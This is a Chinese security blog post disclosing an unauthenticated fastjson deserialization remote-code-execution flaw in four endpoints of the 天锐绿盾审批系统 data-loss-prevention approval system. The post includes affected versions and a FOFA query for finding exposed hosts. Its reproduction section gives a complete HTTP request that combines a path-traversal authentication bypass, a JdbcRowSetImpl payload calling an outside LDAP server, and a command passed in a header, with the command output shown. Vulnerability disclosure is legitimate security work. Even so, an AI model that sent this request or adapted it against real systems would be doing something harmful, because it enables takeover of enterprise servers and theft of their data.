---
title: "天锐绿盾审批系统 updateFilePrintParamsD.do、updateFileOutSendParameter.do、updateScreenshotParameter.do、updateBehaviorCtrlParams.do fastjson反序列化漏洞"
source: https://mrxn.net/jswz/trwfe-updateFilePrintParamsD-fastjson-rce.html
asset_dir: assets/天锐绿盾审批系统-updatefileprintparamsd.do、updatefileoutsendparameter.do、updatescreenshotparameter.do、updatebehaviorctrlparams.d
---

# 天锐绿盾审批系统 updateFilePrintParamsD.do、updateFileOutSendParameter.do、updateScreenshotParameter.do、updateBehaviorCtrlParams.do fastjson反序列化漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/12/19 08:19
* 588浏览
* [2评论](#comment)
* 14分钟阅读

深入探索

安全运维咨询

文本剥离工具

服务器安全服务


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

天锐绿盾审批系统是一款企业级数据防泄密（DLP）解决方案，主要用于对企业内部的敏感文件进行透明加密、权限管理以及审批流程控制，旨在防止数据泄露并保障信息安全。

漏洞扫描服务

该系统的 `updateFilePrintParamsD.do`、`updateScreenshotParameter.do`、 `updateFileOutSendParameter.do` 、`updateBehaviorCtrlParams.do`、接口存在 Fastjson 反序列化漏洞。攻击者可以通过构造恶意的 JSON 数据包，利用 Fastjson 库在处理数据时存在的反序列化缺陷，在未经授权的情况下，在服务器端执行[任意代码](https://mrxn.net/tag/rce)。

成功利用此漏洞可能导致服务器被完全控制，攻击者可以窃取敏感数据、植入恶意程序、篡改系统配置，甚至对整个企业网络造成严重破坏，对企业的业务连续性和数据安全构成重大威胁。

# 影响版本

> 可通过访问 /trwfe/exports/config.ini 获取版本信息

V3.53.240913

深入探索

软件

安全

编程语言教程

V7.05.240904

# fofa语法

> app="TIPPAY-绿盾审批系统"
>
> 安全研究工具

# 漏洞分析

先看下fastjson的版本

[![天锐绿盾审批系统 updateFilePrintParamsD.do、updateFileOutSendParameter.do、updateScreenshotParameter.do、updateBehaviorCtrlParams.do fastjson反序列化漏洞](images/img-001-7222c52854b5.webp)](https://image.mrxn.net/fcd06c93f6724d53a9f0dc001fe8d39c.webp)

1.2.7版本，不是最新版，是存在反序列化rce漏洞的。

再看`updateFilePrintParamsD.do` 的实现部分

[![天锐绿盾审批系统 updateFilePrintParamsD.do、updateFileOutSendParameter.do、updateScreenshotParameter.do、updateBehaviorCtrlParams.do fastjson反序列化漏洞](images/img-002-39dc792eae37.webp)](https://image.mrxn.net/d7df6bebd45a4d90a59560f195473469.webp)

`params`参数被直接用于`JSONObject.parseObject`进行反序列化操作，非常明显的fastjson反序列化漏洞没啥好分析的。

深入探索

防火墙软件

在线安全工具

Web安全书籍

`updateFileOutSendParameter.do` 也是同样如此

[![天锐绿盾审批系统 updateFilePrintParamsD.do、updateFileOutSendParameter.do、updateScreenshotParameter.do、updateBehaviorCtrlParams.do fastjson反序列化漏洞](images/img-003-05506826ac2b.webp)](https://image.mrxn.net/4b04f54dffc74c0ba04cc4997edf82f6.webp)

`updateScreenshotParameter.do` 亦如此

[![天锐绿盾审批系统 updateFilePrintParamsD.do、updateFileOutSendParameter.do、updateScreenshotParameter.do、updateBehaviorCtrlParams.do fastjson反序列化漏洞](images/img-004-2cca15535d84.webp)](https://image.mrxn.net/9b22e71108f644e5b24220c8c269bc54.webp)

`updateScreenshotParamD.do` 亦如此（需要一个合法存在的processInstanceId

[![天锐绿盾审批系统 updateFilePrintParamsD.do、updateFileOutSendParameter.do、updateScreenshotParameter.do、updateBehaviorCtrlParams.do fastjson反序列化漏洞](images/img-005-12147813039f.webp)](https://image.mrxn.net/635eb39f13904d4d862ee5870bdb177c.webp)

`updateBehaviorCtrlParams.do` 亦如此

[![天锐绿盾审批系统 updateFilePrintParamsD.do、updateFileOutSendParameter.do、updateScreenshotParameter.do、updateBehaviorCtrlParams.do fastjson反序列化漏洞](images/img-006-bdd4b09025f7.webp)](https://image.mrxn.net/d8f4c75081d74cb6961d3bca577e69dd.webp)

# 漏洞复现

使用`Java Chains`的`JNDILDAPDeserializePayload`下的`Fastjson反序列化链`配合`One For All Echo 回显`来完成利用

漏洞扫描服务

[![天锐绿盾审批系统 updateFilePrintParamsD.do、updateFileOutSendParameter.do、updateScreenshotParameter.do、updateBehaviorCtrlParams.do fastjson反序列化漏洞](images/img-007-cf3bb661c61f.webp)](https://image.mrxn.net/0b70a47fee754f9ea8b06ffd3062fe1a.webp)

## updateFilePrintParamsD.do

```
POST /trwfe/login.jsp/.%2e/task/updateFilePrintParamsD.do HTTP/1.1
Host: trwfe.mrxn.net
X-Authorization: dir
Content-Type: application/x-www-form-urlencoded

params=%7B%0A++++%22%40type%22%3A+%22com.sun.rowset.JdbcRowSetImpl%22%2C%0A++++%22dataSourceName%22%3A+%22ldap%3A%2F%2F192.168.168.11%3A50389%2F165c51%22%2C%0A++++%22autoCommit%22%3A+true%0A%7D&processInstanceId=1
```

成功执行`dir`命令 并回显命令执行结果

[![天锐绿盾审批系统 updateFilePrintParamsD.do、updateFileOutSendParameter.do、updateScreenshotParameter.do、updateBehaviorCtrlParams.do fastjson反序列化漏洞](images/img-008-20974ff540bd.webp)](https://image.mrxn.net/c92b17c98bb2462aa20e2134c0a383a6.webp)

## updateFileOutSendParameter.do

[![天锐绿盾审批系统 updateFilePrintParamsD.do、updateFileOutSendParameter.do、updateScreenshotParameter.do、updateBehaviorCtrlParams.do fastjson反序列化漏洞](images/img-009-b6a3e8c0d6e9.webp)](https://image.mrxn.net/43c6c3b76ea84d6393db2202e0349a62.webp)

## updateScreenshotParameter.do

[![天锐绿盾审批系统 updateFilePrintParamsD.do、updateFileOutSendParameter.do、updateScreenshotParameter.do、updateBehaviorCtrlParams.do fastjson反序列化漏洞](images/img-010-b7f3a31f9c60.webp)](https://image.mrxn.net/01170c5193f2499eaf36f0d7d9e23f0a.webp)

## updateBehaviorCtrlParams.do

[![天锐绿盾审批系统 updateFilePrintParamsD.do、updateFileOutSendParameter.do、updateScreenshotParameter.do、updateBehaviorCtrlParams.do fastjson反序列化漏洞](images/img-011-6be41d6e0032.webp)](https://image.mrxn.net/b063995fbf08464ca7f56ba6b549cf16.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#0day](https://mrxn.net/tag/0day)
* [#rce](https://mrxn.net/tag/rce)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)
* [5.1.updateFilePrintParamsD.do](#toc-5-1-)
* [5.2.updateFileOutSendParameter.do](#toc-5-2-)
* [5.3.updateScreenshotParameter.do](#toc-5-3-)
* [5.4.updateBehaviorCtrlParams.do](#toc-5-4-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[天锐绿盾审批系统 updateFilePrintParamsD.do、updateFileOutSendParameter.do、updateScreenshotParameter.do、updateBehaviorCtrlParams.do fastjson反序列化漏洞](https://mrxn.net/jswz/trwfe-updateFilePrintParamsD-fastjson-rce.html)  
文章链接：<https://mrxn.net/jswz/trwfe-updateFilePrintParamsD-fastjson-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

安全研究工具

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAALZ0lEQVR4AeycAXLjuA5E/fb+d94/SOfJJCRaTiYbu+ortZhWNxogTUgTO5naf26327/fiX8/v1a1n+kNus/ESu/5zntd8e5Z8a5XbYX6V7FqK6yr6+9GDeRP7fXfu5zANpA/0709E6uN91p9wA3Yep/p5r+DMK8F4faCcAiqu3c5zHkIh2O0rqN9z3Cs2wYyitf1605gNxD42l3Qtw6p77q83y3qIqQegvrNi+ojmoPUyjuONXW9ykP6lOcoet2KQ/rAjEf+3UCOTJf2eyfw1wPxzoFMf7V1SB6C+iDcPqL5r2CvlYv2gqy54uoixA9BdbH3V/8O/vVAvrPoVbM+gR8fyOpuURdXW4Lchc/6IH64Y+8NydlThFnvdfo66lOX/wT++EB+YlP/zz12A3HqHVeHBLnLzAM3hjjTe951uy4X9R2hHsje9EC4+ZVuXoS5Dmaub4Wu0/HIvxvIkenSfu8EtoFApg6PcbU1p2/+jOsT9UPWVz9DiB/YWXvPzncFnwLw8dOFT3oKcOyH6PAYxwW2gYzidf26E/jHu+ar2LcMuQvUIdy+6nJIXh3Ce75z/aL5QrWOlatQr+sKecfKVUD2ZB5mrl7eis5L+2pcT4in+Ca4GwjkLoAZ3S9El4urO8G8CKnv/lUe4jcvQnTY48rTdbl7gbmXuj6x6zDXwcytE2HOw53vBmLRha85gW0gkCk5/Y5uTx1mP4RDUD/M3PqeVxchdXLRus7VC1c5mHuWdwzrRIh/9Bxd6z/KjRoc97O+cBvIWHhdv+4ETgcC81ThMV+9FJjrug/mfN0tFbDpHyWlVcCsfyQ//4A5V/4xYM5/ln189oDkYP9bzu5b8XGtuta3QriveTqQVZNL/29O4MsDqYlXuJ26HkP9uwi5W6y3N8y6+RH1doTUQnCsqWuIvqrrurxqKzovbQw47m/diF8eyLjQdf3zJ/APzNODcJdyenKY813v/s7huL77el+5uPJXHrIGBPV2hOSrpgJmXloFRIfHaP+qqYD4VzokX17jekI8iTfB7WdZsJ9W7RGiQ7BPuzxjQHwwo3UiJG8thK/y+kSY/VUHe23UIXkI2kssb8WKr/SqqTAP6V9ahfozeD0hz5zSL3q2gdQkK1wbjqcM0fWJVfso9MFcb80qr97ROkg/2H9ugORWtfYQIX4IWmdehDkPM3/WZ39IPXDbBnK7vt7iBLZ3WZAp9V3BrDt9EZKHY7QfJG9d1+U9ry5C+sj1F6rB7FEXIXngxp9Qrx4V8o6Quq53DvFVrwqYefeP/HpCxtN4g+ttIDXJMfrezEGmDcGVT3/PQ+rMi/pgzqvrEyE+uKNeUW/nXYd7D0D76c+27CMCHzU2gPCel+uTF24DMXnha09g+TmkpjUGzNM217cP8XVdbh3MPnV9MOdh5vqsK4R46roCjjlEP+pRdeodYa6DmVdtxbN15a0Y/dcTMp7GG1xv77JqUhVne4Lju6JqK6yH+CDY9fJWqIulVay4ugjpD/fPIRCt+lToresx1CF+COoxL1+hPki9fIX2gfjhjtcTsjq1F+nL7yFwnxrc774+3b5v82cIc3/7QPTO7QdzXt+IetUgNRBU7z51iK/nITrMaF33q4s9Lx/xekI8rTfB04E4PZjviq77eiA+uQjH+rN5fc8gZC0IWuOe5WLX5ZB6COrvCLv8ZLGfIsQPQfXC04GU6YrfO4Hlu6w+VbekDpmufJWH2Qfh+jvar+Mzvu6R2wvmtSEcgvp6Xef6OkL6dL9c7HXqhdcTUqfwRrG9y3JPkCnDjD2/4uqru2ClW9cRHu8D5jzQW2zctTfh80Id+PhZFMxo/tN+6AFMbwhM3i3xeQFzHrh+H3J7s6/lX1n9rpB39PVApi0XIToEu/5sP33Wy4+we+Rn2Hs969fX6+XmOx7llwPpxRf/nRPYDcSpwXxHux041s13tJ86zPVwzK0TYfb1foDSEoGPv9M12FsuwuyDma98Z3rPw77vbiAWXfiaE7gG8ppzX666fTCEPD4QrIqjWD3m6jDXw8z1ia4B8XXd/Ar1F6486uWpgKwFQfNiecZQF83JO/5N/npC+mm+mG8D6VPtHHI3wYzuH6JbB+Hmz3R9Isz16iIkD3vUI0I8ctE9ySE+mNG8CMnLRYgOM5rv2Nev/DaQIle8/gR2A+lTk6/Ql2BevsLug9xNK7+6deJKr7w5sbQK+RmWt0JfXVdA9lrXY+gTza24OqSfvHA3kBKveN0JbD9chHlaMHO3CNEhqC5CdO8SEaJ3n3zlMw9zvfoRnvWyBtITguodIfneF6LrN7/i6pC67q/89YTUKbxRbJ9DnBZkeu4RwiGoT+y+zmGuM2+9CPGZFyH6ygfJwx6tsZeoLnZd3hGyxrN1ED8E7beqL/16QjylN8Hte0jfT02rQr2uKyDThmBpY+jvCPHfbsnAzO2R7G37X5Ov9CNf1+SQteAY9YkQn9w9iDDn9UF0COrv+c4hfuD6BdXtzb627yGQKTlVeMy7b/W69PX8StcHWb9zmHXzRwiPve5BhPjlIkR3DXURjvNwrPc+8sLre0idwhvFbiAwT7XvFY7zMOv97uncvpA6CKqLcKz3fnD/567W6hG7DukNwe6DWYdwmNE6EZKXu25HiG/UdwMZk9f175/A9i7LaYqrrfT8sxxyNzzrP1sf5n7V1xpI7oxXTYW+jpWrONMh60FQP4RXjwoIN19aj+sJ8XTeBHcDgXmK8Bx30r4umOvMw6zr76hfvXP1RwhZy9qOkHzvAdEhaN56+bMI6WM9hMMedwN5dpHL99+cwO5ziMs4zRV2H2TaKx3mPMzcOjjWzYvuS14Iqe05iF6eCgjXJ1ZujK5D6vT0/Jn+TP56QjylN8HtXVbfD8x3A4RDsPu9WyB5CKqL1nWu3rH7IH31QTjcP4dAND32gFk337H74bgOZr3Xye0P8UPQ/IjXE+JpvQlu30PczzitulYXS6uQQ6YNwcqNoa8jxA/Bnj/jsK5zfXtAvF03v0L9HfWf6XC8rnX2GfF6QsbTeIPr5feQ1d4gU1/l1SE+mHF1d6x0mOvtr39EOPZaA8lbA+HwGK0X4bEfkncd6zpXh/iB6/chtzf72v2VBfdpAdt2na4IPPVP+21gnXyF+uC4v/mjenOiHrkIc299oj5RXVQ/Q/0izOvCzMu3G0iJV7zuBHbvstyK05eLkKmaFyE6BPV3hOStO8t3H6QeztHeMHvVRdcQ1W+3XMFxPcw6POar/lklf15PSM7hbf7c3mU5PXG1w56H3BVdf7a++3ofSP+VT/+Ieketrrsuh6wBQfWO1aNCva4rOi9tDPMdR4/X1xPST+nFfPseArk74Dl03052xdUhfVe86xB/769PhPgApQ2Bj3eCEOy95B1tAKlbcfWOMNeZh1mHcLjj9YR4Wm+C20D6XbLif7tvyN1g/96v6xB/98n1F6qJpVXIVwjzGhBetWNYD8lDUF20Ri52XT7iNhCLLnztCewGApk6zLjaJsw+CB+nXter+u/qkHVgj8/2hNTW/iog3HoIh6D6CiE+mLH7YZ3fDaQXX/x3T+DHBlJ32BiQu8CXM+bqGpKv6wp9MOuVq4Bj3bojhLlGD8w6hJuv9SrkHStXoV7XFZ2XVqEuljYGZH3g+mnv7c2+fuwJgfuUgdOX6R0CTJ8VeiEk33W5fY5QjwjHvaztPvWOkD7qEN7rIfqZz7rCHxtINbvi709gNxCn2XG1lL6eX+mQuwaC1ukXuy4XYa5XL4Q5BzMvzxiQvGuLEF0vPOb6RPvIOx7ldwPpRRf/3RPYBgKZPjzG1fb6tOG4jz6x94PUdV0/JN85RIf7v8/S03vJITX6IByC3ScXrZOLK908pD8E1Qu3gRS54vUncA3k9TOYdvA/AAAA//9LxLdxAAAABklEQVQDAD3MXuCopLaUAAAAAElFTkSuQmCC)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/trwfe-updateFilePrintParamsD-fastjson-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAALZ0lEQVR4AeycAXLjuA5E/fb+d94/SOfJJCRaTiYbu+ortZhWNxogTUgTO5naf26327/fiX8/v1a1n+kNus/ESu/5zntd8e5Z8a5XbYX6V7FqK6yr6+9GDeRP7fXfu5zANpA/0709E6uN91p9wA3Yep/p5r+DMK8F4faCcAiqu3c5zHkIh2O0rqN9z3Cs2wYyitf1605gNxD42l3Qtw6p77q83y3qIqQegvrNi+ojmoPUyjuONXW9ykP6lOcoet2KQ/rAjEf+3UCOTJf2eyfw1wPxzoFMf7V1SB6C+iDcPqL5r2CvlYv2gqy54uoixA9BdbH3V/8O/vVAvrPoVbM+gR8fyOpuURdXW4Lchc/6IH64Y+8NydlThFnvdfo66lOX/wT++EB+YlP/zz12A3HqHVeHBLnLzAM3hjjTe951uy4X9R2hHsje9EC4+ZVuXoS5Dmaub4Wu0/HIvxvIkenSfu8EtoFApg6PcbU1p2/+jOsT9UPWVz9DiB/YWXvPzncFnwLw8dOFT3oKcOyH6PAYxwW2gYzidf26E/jHu+ar2LcMuQvUIdy+6nJIXh3Ce75z/aL5QrWOlatQr+sKecfKVUD2ZB5mrl7eis5L+2pcT4in+Ca4GwjkLoAZ3S9El4urO8G8CKnv/lUe4jcvQnTY48rTdbl7gbmXuj6x6zDXwcytE2HOw53vBmLRha85gW0gkCk5/Y5uTx1mP4RDUD/M3PqeVxchdXLRus7VC1c5mHuWdwzrRIh/9Bxd6z/KjRoc97O+cBvIWHhdv+4ETgcC81ThMV+9FJjrug/mfN0tFbDpHyWlVcCsfyQ//4A5V/4xYM5/ln189oDkYP9bzu5b8XGtuta3QriveTqQVZNL/29O4MsDqYlXuJ26HkP9uwi5W6y3N8y6+RH1doTUQnCsqWuIvqrrurxqKzovbQw47m/diF8eyLjQdf3zJ/APzNODcJdyenKY813v/s7huL77el+5uPJXHrIGBPV2hOSrpgJmXloFRIfHaP+qqYD4VzokX17jekI8iTfB7WdZsJ9W7RGiQ7BPuzxjQHwwo3UiJG8thK/y+kSY/VUHe23UIXkI2kssb8WKr/SqqTAP6V9ahfozeD0hz5zSL3q2gdQkK1wbjqcM0fWJVfso9MFcb80qr97ROkg/2H9ugORWtfYQIX4IWmdehDkPM3/WZ39IPXDbBnK7vt7iBLZ3WZAp9V3BrDt9EZKHY7QfJG9d1+U9ry5C+sj1F6rB7FEXIXngxp9Qrx4V8o6Quq53DvFVrwqYefeP/HpCxtN4g+ttIDXJMfrezEGmDcGVT3/PQ+rMi/pgzqvrEyE+uKNeUW/nXYd7D0D76c+27CMCHzU2gPCel+uTF24DMXnha09g+TmkpjUGzNM217cP8XVdbh3MPnV9MOdh5vqsK4R46roCjjlEP+pRdeodYa6DmVdtxbN15a0Y/dcTMp7GG1xv77JqUhVne4Lju6JqK6yH+CDY9fJWqIulVay4ugjpD/fPIRCt+lToresx1CF+COoxL1+hPki9fIX2gfjhjtcTsjq1F+nL7yFwnxrc774+3b5v82cIc3/7QPTO7QdzXt+IetUgNRBU7z51iK/nITrMaF33q4s9Lx/xekI8rTfB04E4PZjviq77eiA+uQjH+rN5fc8gZC0IWuOe5WLX5ZB6COrvC